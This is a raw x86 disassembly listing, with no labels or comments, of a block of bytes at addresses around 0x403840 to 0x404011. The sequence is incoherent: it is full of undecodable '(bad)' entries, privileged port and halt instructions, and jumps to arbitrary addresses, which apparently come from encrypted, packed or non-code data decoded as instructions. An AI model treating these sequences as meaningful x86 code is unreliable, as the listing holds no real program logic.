  40383c:	sbb    dh,dl
  40383e:	mov    bl,0x8d
  403840:	adc    al,BYTE PTR [edx-0x5d]
  403843:	push   cs
  403844:	ror    DWORD PTR [edx+0x5df06fce],cl
  40384a:	retf   0x131
  40384d:	mov    esi,0x9e265efa
  403852:	stos   DWORD PTR es:[edi],eax
  403853:	mov    edx,0x3cbcf717
  403858:	push   cs
  403859:	js     0x4037ff
  40385b:	in     al,0x42
  40385d:	pop    ds
  40385e:	imul   ebp,DWORD PTR [ecx+0x1f6f2138],0xffffffba
  403865:	dec    esi
  403866:	lods   eax,DWORD PTR ds:[esi]
  403867:	adc    ecx,DWORD PTR [ecx+0x7274c9eb]
  40386d:	or     al,0xd
  40386f:	fimul  WORD PTR [eax+ecx*1+0x1b74946c]
  403876:	dec    ecx
  403877:	xor    DWORD PTR [esp+eax*1+0x1d3fb355],0x6ae28917
  403882:	stc    
  403883:	int3   
  403884:	fcomp  DWORD PTR [esi]
  403886:	mov    bl,0xa5
  403888:	sahf   
  403889:	pop    esp
  40388a:	sbb    DWORD PTR es:[edi-0x2eac492f],ebp
  403891:	xchg   ebp,eax
  403892:	iret   
  403893:	lock scas eax,DWORD PTR es:[edi]
  403895:	out    0x1b,al
  403897:	push   ds
  403898:	rcr    ch,cl
  40389a:	or     eax,0x125bcec1
  40389f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038a0:	push   esi
  4038a1:	hlt    
  4038a2:	mov    eax,0x3236ccbd
  4038a7:	in     al,dx
  4038a8:	aam    0x55
  4038aa:	call   0x200b:0x3a1a2ecd
  4038b1:	out    0xdf,al
  4038b3:	(bad)  
  4038b4:	and    al,0xd7
  4038b6:	xor    al,0x3e
  4038b8:	gs adc eax,0x3a3e0884
  4038be:	or     esp,DWORD PTR ds:0xa384b8ae
  4038c4:	push   ecx
  4038c5:	pushf  
  4038c6:	adc    edi,DWORD PTR [edx+0x7b]
  4038c9:	es std 
  4038cb:	jge    0x403883
  4038cd:	cmp    al,0xca
  4038cf:	ret    
  4038d0:	sub    al,0x0
  4038d2:	cli    
  4038d3:	pop    esi
  4038d4:	inc    ebx
  4038d5:	add    edi,ecx
  4038d7:	(bad)  
  4038d8:	fisub  WORD PTR [esi+0x6b]
  4038db:	ss popf 
  4038dd:	ficomp DWORD PTR [ebx]
  4038df:	xchg   edx,eax
  4038e0:	add    bh,dh
  4038e2:	add    eax,DWORD PTR [ebp+0x4]
  4038e5:	dec    ecx
  4038e6:	push   cs
  4038e7:	hlt    
  4038e8:	in     eax,dx
  4038e9:	xchg   DWORD PTR [edx],esp
  4038eb:	push   edx
  4038ec:	mov    ds:0xde71c092,al
  4038f1:	dec    ebp
  4038f2:	xchg   ecx,eax
  4038f3:	clc    
  4038f4:	dec    eax
  4038f5:	stos   BYTE PTR es:[edi],al
  4038f6:	test   eax,0x5ab6c730
  4038fb:	xor    al,0x96
  4038fd:	add    ch,BYTE PTR [eax+0x7e]
  403900:	mov    esp,0x497d1ade
  403905:	or     eax,esi
  403907:	push   0xfffffff4
  403909:	into   
  40390a:	mov    DWORD PTR [eax+0x1420a098],edi
  403910:	dec    edi
  403911:	clts   
  403913:	dec    eax
  403914:	(bad)  
  403915:	mov    al,ds:0x629fe66b
  40391a:	add    DWORD PTR [edx+edx*1],0x3c27f20b
  403921:	popf   
  403922:	sub    eax,0xb5b5a0dc
  403927:	dec    edi
  403928:	inc    ebp
  403929:	icebp  
  40392a:	jmp    0x61c36944
  40392f:	mov    ecx,0xe5cb7009
  403934:	popf   
  403935:	(bad)  
  403936:	int3   
  403937:	(bad)  
  403938:	in     eax,0xd0
  40393a:	push   esi
  40393b:	inc    esp
  40393c:	dec    edi
  40393d:	mov    esi,0xa8968a13
  403942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403943:	(bad)  
  403944:	xchg   esp,eax
  403945:	out    dx,al
  403946:	add    ah,BYTE PTR [ebp+0x64275b44]
  40394c:	xor    al,0xaf
  40394e:	mov    ds:0x88193cb0,al
  403953:	and    al,0x8c
  403955:	aam    0xce
  403957:	lods   al,BYTE PTR ds:[esi]
  403958:	dec    esi
  403959:	clc    
  40395a:	and    DWORD PTR [edi+0x54],0x1b4ba81e
  403961:	outs   dx,DWORD PTR ds:[esi]
  403962:	cmp    BYTE PTR [ebx],dh
  403964:	cdq    
  403965:	repnz in eax,dx
  403967:	pushf  
  403968:	int3   
  403969:	and    cl,bh
  40396b:	aas    
  40396c:	enter  0x98bd,0xb
  403970:	fdivr  DWORD PTR [edi+0x3c4333aa]
  403976:	repz adc al,BYTE PTR [edi-0xf300ef]
  40397d:	lahf   
  40397e:	xchg   esi,eax
  40397f:	shl    DWORD PTR [ebp+ebp*2-0x7485764b],1
  403986:	pop    ebp
  403987:	(bad)  
  403988:	cdq    
  403989:	mov    WORD PTR ds:0x6d29c19e,cs
  40398f:	in     al,0xb1
  403991:	(bad)  
  403992:	cmp    dh,dl
  403994:	mov    cl,0x27
  403996:	sub    ebp,DWORD PTR [edi+0x72]
  403999:	popa   
  40399a:	lods   al,BYTE PTR ds:[esi]
  40399b:	inc    esi
  40399c:	mov    ss,WORD PTR [eax-0x31]
  40399f:	mov    eax,ds:0xe720c711
  4039a4:	mov    edi,0x8b2d7dc2
  4039a9:	dec    ecx
  4039aa:	gs int 0xde
  4039ad:	in     al,dx
  4039ae:	fnstcw WORD PTR ds:0x47921215
  4039b4:	mov    ah,0xd9
  4039b6:	fs dec edx
  4039b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039b9:	adc    edx,DWORD PTR [esi+0x5e5b332b]
  4039bf:	push   ebx
  4039c0:	xchg   edi,ebx
  4039c2:	pusha  
  4039c3:	ret    
  4039c4:	in     al,dx
  4039c5:	adc    DWORD PTR [esi+0x158ccd39],esp
  4039cb:	push   edx
  4039cc:	push   cs
  4039cd:	sar    DWORD PTR [edx+ecx*4+0x51],cl
  4039d1:	jmp    0x1314:0xe45d25ec
  4039d8:	retf   0x5213
  4039db:	lods   al,BYTE PTR ds:[esi]
  4039dc:	int    0x17
  4039de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039df:	mov    ecx,0x63d366ad
  4039e4:	jno    0x403a0f
  4039e6:	aad    0x7
  4039e8:	es loopne 0x4039e3
  4039eb:	sbb    DWORD PTR [ebp-0x1cb0609a],ebp
  4039f1:	add    ax,0x567f
  4039f5:	adc    al,0xff
  4039f7:	and    al,0x56
  4039f9:	pop    ecx
  4039fa:	shl    BYTE PTR [eax],0x56
  4039fd:	sub    eax,0x7f7d4601
  403a02:	jae    0x403a61
  403a04:	jl     0x403a09
  403a06:	test   edx,0xe6633e13
  403a0c:	mov    eax,ds:0xcad37748
  403a11:	lock sub WORD PTR [eax-0x637c47e4],sp
  403a19:	stos   BYTE PTR es:[edi],al
  403a1a:	adc    eax,0x5dea6434
  403a1f:	inc    esi
  403a20:	or     esp,edi
  403a22:	mov    DWORD PTR [esi-0x3690c729],edx
  403a28:	fcomp  DWORD PTR [eax-0x4e981fa0]
  403a2e:	jge    0x403a6d
  403a30:	adc    al,0x3
  403a32:	or     esi,DWORD PTR [edi+0xf]
  403a35:	adc    eax,0x269ce29
  403a3a:	adc    BYTE PTR [ebx+eiz*2],bl
  403a3d:	dec    ebp
  403a3e:	cmp    al,0x9b
  403a40:	dec    edx
  403a41:	mov    esp,0x82ba44a4
  403a46:	sbb    dh,BYTE PTR [ebp+0xd]
  403a49:	stc    
  403a4a:	jns    0x4039f9
  403a4c:	push   ss
  403a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a4e:	test   al,0x7a
  403a50:	test   DWORD PTR [edx+0x15],edx
  403a53:	xchg   esp,eax
  403a54:	and    eax,0x19a0f26d
  403a59:	jo     0x403ac9
  403a5b:	xchg   ebx,esp
  403a5d:	xor    DWORD PTR ds:0x695a6ea7,0xcbfdc0de
  403a67:	lahf   
  403a68:	jmp    0xabc8553d
  403a6d:	or     DWORD PTR [eax+0x7cc1aa8f],ecx
  403a73:	jne    0x403abf
  403a75:	mov    ch,BYTE PTR [ecx-0x26ac2010]
  403a7b:	in     eax,0x2
  403a7d:	mov    eax,ds:0x6028be5a
  403a82:	mov    eax,0xd09c1727
  403a87:	sub    eax,0x1e39e526
  403a8c:	push   ebx
  403a8d:	pop    esp
  403a8e:	add    BYTE PTR [edi+0x575edb32],0x22
  403a95:	inc    ebp
  403a96:	jmp    0xd4e5:0x8e7099f8
  403a9d:	xor    ebx,DWORD PTR [ecx+0x67569ab1]
  403aa3:	sbb    al,dl
  403aa5:	js     0x403ace
  403aa7:	out    0x50,eax
  403aa9:	ja     0x403a74
  403aab:	push   ebp
  403aac:	hlt    
  403aad:	add    DWORD PTR [edx*1-0x45a11d88],esp
  403ab4:	jo     0x403ad9
  403ab6:	mov    cl,0xc0
  403ab8:	fdiv   QWORD PTR [ebp-0x30]
  403abb:	pop    esi
  403abc:	cmp    eax,0x56385896
  403ac1:	retf   
  403ac2:	aas    
  403ac3:	out    0x0,al
  403ac5:	push   0x4d06e500
  403aca:	cmp    eax,DWORD PTR [edi-0x11283102]
  403ad0:	xor    al,BYTE PTR [edi+0x1316d256]
  403ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ad7:	ss jg  0x403b3a
  403ada:	pop    ebp
  403adb:	pop    ebx
  403adc:	rcl    BYTE PTR [esi+ecx*8-0x2f0f4c16],1
  403ae3:	adc    eax,DWORD PTR [eax+0x40068157]
  403ae9:	inc    edi
  403aea:	mov    ch,0xc0
  403aec:	pop    ss
  403aed:	aaa    
  403aee:	rol    DWORD PTR [eax+0x63eed6b4],0xcc
  403af5:	mov    dl,0x63
  403af7:	or     DWORD PTR [ecx+0x222a64dd],ebx
  403afd:	test   DWORD PTR [ecx+0x7ec2f838],edi
  403b03:	mov    cl,0xa6
  403b05:	sbb    al,0xf1
  403b07:	add    al,0xd4
  403b09:	pop    esi
  403b0a:	or     BYTE PTR [eax+0x51667392],0x55
  403b11:	and    al,0x2a
  403b13:	loopne 0x403adf
  403b15:	mov    al,0xc0
  403b17:	push   es
  403b18:	imul   edi,DWORD PTR [ebx+ebx*8-0x2d2cfbbc],0x429e70b0
  403b23:	adc    al,0x55
  403b25:	and    eax,0x40954c51
  403b2a:	cmp    al,0xd
  403b2c:	aad    0xae
  403b2e:	mov    DWORD PTR [edx],ebp
  403b30:	pop    eax
  403b31:	jmp    0x4d803017
  403b36:	jp     0x403ad1
  403b38:	push   cs
  403b39:	push   0xffffffe0
  403b3b:	sti    
  403b3c:	(bad)  
  403b3d:	mov    esi,0x55be1796
  403b42:	mov    DWORD PTR [ebp-0x53d47b2a],ebp
  403b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b49:	pop    edi
  403b4a:	retf   0xe9a6
  403b4d:	loopne 0x403b70
  403b4f:	test   eax,0x7582bb4b
  403b54:	add    eax,0x75d6f89e
  403b59:	and    DWORD PTR [ebx-0x29],edi
  403b5c:	inc    ecx
  403b5d:	push   0xffffffea
  403b5f:	push   eax
  403b60:	test   ebx,0x569aa9f8
  403b66:	stos   BYTE PTR es:[edi],al
  403b67:	fiadd  DWORD PTR [eax-0x4542a3fc]
  403b6d:	shl    BYTE PTR [edx],cl
  403b6f:	jae    0x403b8d
  403b71:	cmp    ebp,ecx
  403b73:	push   edx
  403b74:	dec    esp
  403b75:	mov    dl,0xec
  403b77:	xor    al,0x51
  403b79:	(bad)  
  403b7a:	clc    
  403b7b:	sti    
  403b7c:	mov    al,ds:0xb13edc85
  403b81:	call   0x448bb8bf
  403b86:	lock and BYTE PTR [esi],ch
  403b89:	out    dx,al
  403b8a:	outs   dx,BYTE PTR ds:[esi]
  403b8b:	and    eax,0xab8a4ec2
  403b90:	sbb    cl,bh
  403b92:	pushf  
  403b93:	sub    DWORD PTR [ecx+0x7e],edx
  403b96:	pop    ebx
  403b97:	pop    ecx
  403b98:	mov    WORD PTR [eax+esi*4],ds
  403b9b:	pop    eax
  403b9c:	cdq    
  403b9d:	div    DWORD PTR [edx+0x2d620aa1]
  403ba3:	xchg   DWORD PTR [esi-0xd90a57e],edx
  403ba9:	and    al,0xd6
  403bab:	mov    BYTE PTR [edi],bh
  403bad:	push   edx
  403bae:	bound  edx,QWORD PTR [esi+0x42]
  403bb1:	jbe    0x403b78
  403bb3:	stos   DWORD PTR es:[edi],eax
  403bb4:	mov    esp,0x1371f543
  403bb9:	(bad)
  403bbc:	out    0x38,al
  403bbe:	or     al,0xf5
  403bc0:	and    edi,DWORD PTR [ecx-0x7c]
  403bc3:	(bad)  
  403bc4:	aad    0x4a
  403bc6:	mov    ebx,0xe988e0e7
  403bcb:	xchg   ecx,eax
  403bcc:	cmp    edx,DWORD PTR [esi]
  403bce:	es int3 
  403bd0:	stos   BYTE PTR es:[edi],al
  403bd1:	fadd   st(6),st
  403bd3:	rcl    DWORD PTR [ebx],cl
  403bd5:	xchg   edi,eax
  403bd6:	mov    ds:0xe459fdbd,eax
  403bdb:	call   0x6802b627
  403be0:	loopne 0x403ba8
  403be2:	jo     0x403bd7
  403be4:	mov    al,ds:0x39e83941
  403be9:	push   ss
  403bea:	es fmul st(0),st
  403bed:	dec    edx
  403bee:	(bad)  [ebx+0x6]
  403bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bf2:	jl     0x403bec
  403bf4:	cmc    
  403bf5:	iret   
  403bf6:	daa    
  403bf7:	retf   
  403bf8:	nop
  403bf9:	inc    edi
  403bfa:	push   edi
  403bfb:	xchg   ecx,eax
  403bfc:	bound  ecx,QWORD PTR [ecx-0x4aa19086]
  403c02:	lock lahf 
  403c04:	lock std 
  403c06:	sbb    ebp,DWORD PTR [ecx+0x7e]
  403c09:	mov    ah,0x3
  403c0b:	(bad)  
  403c0c:	pop    ecx
  403c0d:	aaa    
  403c0e:	retf   
  403c0f:	pop    ebp
  403c10:	mov    ?,WORD PTR [esi-0xf7ee25c]
  403c16:	(bad)  
  403c17:	adc    ecx,eax
  403c19:	sub    al,BYTE PTR [ecx+0x7ba32e5]
  403c1f:	or     al,0x3e
  403c21:	dec    esi
  403c22:	or     eax,0x73c4e9dc
  403c27:	adc    BYTE PTR [ebx-0x36],cl
  403c2a:	int    0xcc
  403c2c:	sbb    DWORD PTR [ebp-0x4864d912],0x9b65d15f
  403c36:	xchg   ecx,eax
  403c37:	lods   al,BYTE PTR ds:[esi]
  403c38:	in     eax,0x56
  403c3a:	fld    DWORD PTR ds:0x5a72f502
  403c40:	or     DWORD PTR [eax-0x2b],esp
  403c43:	jecxz  0x403c8d
  403c45:	pop    ds
  403c46:	imul   ecx,DWORD PTR [edx+0x7e0da7c],0x8c3bbb24
  403c50:	push   es
  403c51:	xor    ebp,DWORD PTR [edx-0x2a0d5d2a]
  403c57:	mov    bl,0x26
  403c59:	xor    DWORD PTR [edx],edi
  403c5b:	cmp    eax,0x5af3c41d
  403c60:	scas   al,BYTE PTR es:[edi]
  403c61:	xchg   esi,eax
  403c62:	sbb    eax,0x1d74b92c
  403c67:	mov    edi,0xa34b56cf
  403c6c:	and    al,0x36
  403c6e:	push   esp
  403c6f:	push   ecx
  403c70:	xor    DWORD PTR [edi-0x70],ebp
  403c73:	aad    0x8c
  403c75:	(bad)  
  403c76:	dec    ebx
  403c77:	xor    BYTE PTR [edi],al
  403c79:	inc    edi
  403c7a:	mov    esp,0x50e6da2b
  403c7f:	popa   
  403c80:	lock imul ebp,DWORD PTR ds:0x5897ae6,0x7b36436c
  403c8b:	repnz or eax,0x203b53da
  403c91:	dec    edx
  403c92:	cmp    eax,0x8c12e21d
  403c97:	pop    ss
  403c98:	push   edi
  403c99:	jbe    0x403ce6
  403c9b:	push   eax
  403c9c:	fwait
  403c9d:	lea    esi,[ecx]
  403c9f:	push   edx
  403ca0:	and    BYTE PTR [edx+0x4a2daecc],ah
  403ca6:	(bad)  
  403ca7:	pop    esi
  403ca8:	jmp    0xab6a2c30
  403cad:	dec    ecx
  403cae:	ficomp DWORD PTR [ecx-0x79]
  403cb1:	mov    eax,0x4535dd8d
  403cb6:	mov    BYTE PTR [ebp*1-0x7225d3fa],dh
  403cbd:	icebp  
  403cbe:	lock sbb esi,esi
  403cc1:	sub    DWORD PTR [eax],edi
  403cc3:	adc    DWORD PTR [ebp+ebx*4+0x2db62ac7],eax
  403cca:	les    edx,FWORD PTR [edx-0x7e]
  403ccd:	jnp    0x403d1a
  403ccf:	les    esp,FWORD PTR [ecx]
  403cd1:	into   
  403cd2:	sbb    ah,BYTE PTR [edx+ebp*1+0x2]
  403cd6:	push   esp
  403cd7:	into   
  403cd8:	out    dx,eax
  403cd9:	(bad)  
  403cda:	shl    BYTE PTR [ecx+0x326c959d],cl
  403ce0:	sub    ebp,DWORD PTR [edx]
  403ce2:	aam    0xd
  403ce4:	out    dx,al
  403ce5:	mov    bl,bh
  403ce7:	ret    
  403ce8:	pop    esi
  403ce9:	fs jo  0x403c9c
  403cec:	push   0x4757b111
  403cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf2:	scas   al,BYTE PTR es:[edi]
  403cf3:	jmp    0x20397ae3
  403cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf9:	aad    0x1
  403cfb:	ret    
  403cfc:	sbb    DWORD PTR [ebp-0x32],0xffffffc4
  403d00:	push   ecx
  403d01:	int    0x7f
  403d03:	push   edx
  403d04:	(bad)
  403d07:	mov    bl,0x41
  403d09:	sbb    dh,dl
  403d0b:	push   0xd52bf54d
  403d10:	or     al,0x4c
  403d12:	rcr    DWORD PTR [edx],0x29
  403d15:	rol    ebp,0x25
  403d18:	mov    al,0x7c
  403d1a:	sub    bl,BYTE PTR [edx]
  403d1c:	or     BYTE PTR [ecx],ah
  403d1e:	push   0xffffffd6
  403d20:	push   ss
  403d21:	mov    cl,ch
  403d23:	xor    BYTE PTR [edi],al
  403d25:	repnz out 0xa,ax
  403d29:	pop    ebx
  403d2a:	ins    BYTE PTR es:[edi],dx
  403d2b:	fwait
  403d2c:	xor    BYTE PTR [esi+0x4f],bh
  403d2f:	or     edi,DWORD PTR [ebx]
  403d31:	addr16 push ebp
  403d33:	inc    esp
  403d34:	(bad)  [edx-0x52]
  403d37:	daa    
  403d38:	jae    0x403d2b
  403d3a:	rcl    BYTE PTR ds:0x659a232,1
  403d40:	aaa    
  403d41:	call   0x6b7aa1a0
  403d46:	dec    ebp
  403d47:	add    BYTE PTR [ebx],dl
  403d49:	aad    0x83
  403d4b:	pop    edi
  403d4c:	pop    edi
  403d4d:	mov    eax,ebp
  403d4f:	stos   DWORD PTR es:[edi],eax
  403d50:	push   esp
  403d51:	jne    0x403d0f
  403d53:	xor    al,0x7b
  403d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d56:	add    DWORD PTR [edi+0x5c36339e],ebx
  403d5c:	or     BYTE PTR [edi],dl
  403d5e:	test   bl,cl
  403d60:	sti    
  403d61:	scas   eax,DWORD PTR es:[edi]
  403d62:	pop    esi
  403d63:	xchg   edi,eax
  403d64:	dec    esi
  403d65:	arpl   WORD PTR [ecx+0x3e67853c],di
  403d6b:	cmc    
  403d6c:	cmp    eax,0xf6b8e4a0
  403d71:	mov    ebp,0xb09fc4c7
  403d76:	push   ebp
  403d77:	sub    BYTE PTR [ecx-0xb366d45],bl
  403d7d:	xchg   DWORD PTR [ebx+eiz*4-0x6a12840f],eax
  403d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d85:	pop    ss
  403d86:	pop    edi
  403d87:	(bad)  
  403d88:	sub    ah,cl
  403d8a:	aad    0x71
  403d8c:	push   cs
  403d8d:	adc    cl,BYTE PTR [edx+0x67]
  403d90:	pop    edi
  403d91:	xchg   DWORD PTR [esi+0x9],edi
  403d94:	inc    esp
  403d95:	push   esi
  403d96:	xchg   edx,eax
  403d97:	and    eax,0xa018c428
  403d9c:	lahf   
  403d9d:	imul   ebp,DWORD PTR [ebp-0x12],0x42ddccb1
  403da4:	pop    edi
  403da5:	pop    ds
  403da6:	inc    esp
  403da7:	sahf   
  403da8:	and    al,0x76
  403daa:	sub    bl,BYTE PTR [edi+0x2e33dfaf]
  403db0:	add    DWORD PTR [esi],0xfffffffb
  403db3:	nop
  403db4:	sahf   
  403db5:	inc    esp
  403db6:	cmp    BYTE PTR ds:0x310010a2,bh
  403dbc:	lock shr DWORD PTR [esp+edi*8-0x641358ef],cl
  403dc4:	(bad)  
  403dc5:	fadd   QWORD PTR [esi]
  403dc7:	dec    edx
  403dc8:	add    ebx,esi
  403dca:	cmc    
  403dcb:	shl    bh,1
  403dcd:	idiv   al
  403dcf:	dec    ebp
  403dd0:	(bad)  
  403dd1:	push   ebp
  403dd3:	lods   al,BYTE PTR ds:[esi]
  403dd4:	lahf   
  403dd5:	jge    0x403dc9
  403dd7:	sbb    eax,0x5c0c0a5d
  403ddc:	or     eax,0x83f9cc4e
  403de1:	adc    edx,ecx
  403de3:	call   DWORD PTR [edx+0xbab663d]
  403de9:	add    BYTE PTR [ebp+0x1f],dl
  403dec:	xor    edx,DWORD PTR [ebx+edx*1+0x5f6fd663]
  403df3:	xor    DWORD PTR [ebx+edx*8],eax
  403df6:	cvtdq2ps xmm4,xmm6
  403df9:	jno    0x403e46
  403dfb:	cld    
  403dfc:	dec    edx
  403dfd:	lods   eax,DWORD PTR ds:[esi]
  403dfe:	fxch   st(1)
  403e00:	sahf   
  403e01:	mov    BYTE PTR [ebp+0x55],0x81
  403e05:	cmp    esp,DWORD PTR [ebp-0x5d579f7d]
  403e0b:	pop    edx
  403e0c:	ss (bad) 
  403e0e:	aam    0x51
  403e10:	mov    WORD PTR [edx+ecx*1+0x5a],gs
  403e14:	inc    eax
  403e15:	repnz dec ebp
  403e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e18:	dec    BYTE PTR ds:0x4bfc3ae9
  403e1e:	push   esi
  403e1f:	aaa    
  403e20:	stc    
  403e21:	xchg   BYTE PTR [esi-0x6d],ch
  403e24:	test   eax,0xe75649bb
  403e29:	cmc    
  403e2a:	icebp  
  403e2b:	data16 fistp DWORD PTR [esi+ebp*2]
  403e2f:	mov    ecx,eax
  403e31:	shl    ch,cl
  403e33:	jp     0x403e3f
  403e35:	arpl   WORD PTR [edx+0x282b282c],ax
  403e3b:	mov    BYTE PTR [ebx-0x3e9cea73],al
  403e41:	add    DWORD PTR [ebp+0x32],eax
  403e44:	sbb    dl,BYTE PTR [ecx]
  403e46:	test   eax,0x3b57f577
  403e4b:	xchg   ebp,eax
  403e4c:	dec    ebx
  403e4d:	sti    
  403e4e:	push   edi
  403e4f:	cmp    eax,0x995bf09f
  403e54:	test   al,0x6a
  403e56:	push   ecx
  403e57:	inc    edx
  403e58:	pop    esi
  403e59:	mov    dh,0xe5
  403e5b:	repz sahf 
  403e5d:	xchg   edx,eax
  403e5e:	xchg   ebp,eax
  403e5f:	jbe    0x403e76
  403e61:	test   DWORD PTR gs:[esi],0x94d0fe90
  403e68:	ja     0x403e13
  403e6a:	in     al,0x95
  403e6c:	or     al,0x66
  403e6e:	jecxz  0x403e5e
  403e70:	mov    WORD PTR [edi],ss
  403e72:	add    eax,0xed63de2d
  403e77:	or     BYTE PTR [edi-0xb],bh
  403e7a:	lahf   
  403e7b:	nop
  403e7c:	(bad)  
  403e7d:	out    dx,eax
  403e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e7f:	arpl   WORD PTR [eax+0x2d259bbc],di
  403e85:	jo     0x403e9c
  403e87:	fst    DWORD PTR [edx]
  403e89:	jle    0x403e32
  403e8b:	sub    BYTE PTR [edx+0x4ce9bef2],dh
  403e91:	jo     0x403ef6
  403e93:	add    eax,0x3fec0ec6
  403e98:	loopne 0x403e30
  403e9a:	in     al,dx
  403e9b:	inc    edi
  403e9c:	push   edi
  403e9d:	inc    edx
  403e9e:	mov    eax,0xef6d586d
  403ea3:	rol    BYTE PTR [ecx],1
  403ea5:	xchg   ebp,eax
  403ea6:	mov    bh,0xf1
  403ea8:	adc    edx,esi
  403eaa:	add    BYTE PTR [eax-0x61433fcb],bh
  403eb0:	mov    dl,0x63
  403eb2:	call   DWORD PTR fs:[ecx+ecx*1-0x1a]
  403eb7:	ss jb  0x403e6b
  403eba:	xchg   esi,eax
  403ebb:	iret   
  403ebc:	cmp    BYTE PTR [ebx-0x5b],0xf1
  403ec0:	sbb    ebx,edi
  403ec2:	dec    ebp
  403ec3:	outs   dx,DWORD PTR ds:[esi]
  403ec4:	xchg   BYTE PTR [ebp-0x40],ch
  403ec7:	inc    ecx
  403ec8:	scas   al,BYTE PTR es:[edi]
  403ec9:	or     eax,0x1ce74c5
  403ece:	out    0x14,al
  403ed0:	or     eax,0x5e00c3ea
  403ed5:	popf   
  403ed6:	repz or cl,BYTE PTR [edx-0x3d772dcc]
  403edd:	mov    bh,0x11
  403edf:	loopne 0x403e68
  403ee1:	xchg   ebp,eax
  403ee2:	jl     0x403ee0
  403ee4:	push   0x39
  403ee6:	fwait
  403ee7:	add    BYTE PTR [edi-0x30fd6644],0xf8
  403eee:	xchg   ecx,eax
  403eef:	sub    cl,BYTE PTR [edi+0x55]
  403ef2:	adc    al,0xfc
  403ef4:	mov    al,0xa4
  403ef6:	xchg   esp,eax
  403ef7:	dec    edx
  403ef8:	jg     0x403f3e
  403efa:	ror    DWORD PTR [esi-0x1ed49ae6],1
  403f00:	sbb    bh,bh
  403f02:	jbe    0x403ef8
  403f04:	inc    ebx
  403f05:	xor    BYTE PTR [eax+edi*4+0x7d6ddf0d],dl
  403f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f0d:	and    dl,cl
  403f0f:	das    
  403f10:	cdq    
  403f11:	inc    ebx
  403f12:	cmc    
  403f13:	jmp    0x149f:0xd7a4d448
  403f1a:	jnp    0x403ed9
  403f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f1d:	stos   BYTE PTR es:[edi],al
  403f1e:	ret    0xcabc
  403f21:	xchg   esi,eax
  403f22:	das    
  403f23:	mov    dl,0x4e
  403f25:	stos   BYTE PTR es:[edi],al
  403f26:	ss retf 
  403f28:	call   0x8984:0x2e8e3fb5
  403f2f:	fwait
  403f30:	call   0x43c11429
  403f35:	or     edx,edx
  403f37:	stos   BYTE PTR es:[edi],al
  403f38:	pop    esi
  403f39:	inc    edx
  403f3a:	mov    dl,0x67
  403f3c:	es inc edi
  403f3e:	retf   
  403f3f:	cmc    
  403f40:	jae    0x403ee2
  403f42:	cdq    
  403f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f44:	ret    0x2b8b
  403f47:	or     eax,0xcaff6608
  403f4c:	sbb    eax,0x9f0a792e
  403f51:	mov    ebp,0xd227e96e
  403f56:	mov    eax,ds:0x2a516405
  403f5b:	xor    eax,0x66
  403f5e:	xchg   DWORD PTR [ebp-0x5],edi
  403f61:	repnz test ebx,ebp
  403f64:	pop    es
  403f65:	jmp    0xf12d5dda
  403f6a:	outs   dx,BYTE PTR ds:[esi]
  403f6b:	fnstcw WORD PTR [edi+0x55]
  403f6e:	push   ecx
  403f6f:	push   ecx
  403f70:	xor    ch,bh
  403f72:	pop    ds
  403f73:	mov    bl,0x89
  403f75:	inc    eax
  403f76:	push   esi
  403f77:	repnz mov eax,ds:0x54a05dae
  403f7d:	dec    ebx
  403f7e:	or     al,0x17
  403f80:	xor    eax,DWORD PTR [edx+0x51fcb22c]
  403f86:	pop    esp
  403f87:	add    edx,edi
  403f89:	or     DWORD PTR [edi+0x3c],eax
  403f8c:	jae    0x403fc7
  403f8e:	add    DWORD PTR [edx+0x57],0xffffffa5
  403f92:	mov    edi,0xc35b26b4
  403f97:	add    BYTE PTR [edi],bl
  403f99:	out    0xa7,eax
  403f9b:	adc    al,ch
  403f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f9e:	fs mov dh,0xfd
  403fa1:	and    BYTE PTR [esi],al
  403fa3:	sbb    eax,0x443552a5
  403fa8:	jecxz  0x403fc2
  403faa:	pop    ds
  403fab:	pop    ss
  403fac:	pushf  
  403fad:	jl     0x403fa9
  403faf:	iret   
  403fb0:	dec    edi
  403fb1:	push   eax
  403fb2:	sbb    DWORD PTR [eax],edi
  403fb4:	cmp    DWORD PTR [esi],ebp
  403fb6:	jecxz  0x403fec
  403fb8:	call   0xb656:0x8067455f
  403fbf:	dec    ecx
  403fc0:	mov    edx,0x25424da8
  403fc5:	in     eax,0x2f
  403fc7:	add    al,0x1f
  403fc9:	retf   0x221f
  403fcc:	aam    0x59
  403fce:	jl     0x40402b
  403fd0:	mov    WORD PTR ds:0x2ed11542,ds
  403fd6:	jge    0x40401d
  403fd8:	int    0x96
  403fda:	sti    
  403fdb:	cs dec esi
  403fdd:	adc    bl,dl
  403fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fe0:	pop    eax
  403fe1:	jle    0x403f8d
  403fe3:	cmp    eax,0x384a8d90
  403fe8:	mov    DWORD PTR [edx],ebp
  403fea:	aam    0x79
  403fec:	add    DWORD PTR [ecx],0xbf15af00
  403ff2:	in     al,0xb7
  403ff4:	mov    edi,0x9f12ffc4
  403ff9:	cdq    
  403ffa:	pop    edi
  403ffb:	lods   eax,DWORD PTR ds:[esi]
  403ffc:	ja     0x40402e
  403ffe:	rcr    DWORD PTR [edx+0x276fd73e],1
  404004:	rol    DWORD PTR [ebp-0x5c],0x6a
  404008:	mov    esi,0x2bbb22fb
  40400d:	stos   DWORD PTR es:[edi],eax
  40400e:	sub    ch,BYTE PTR [esi]
  404010:	sahf   
  404011:	in     eax,0x24
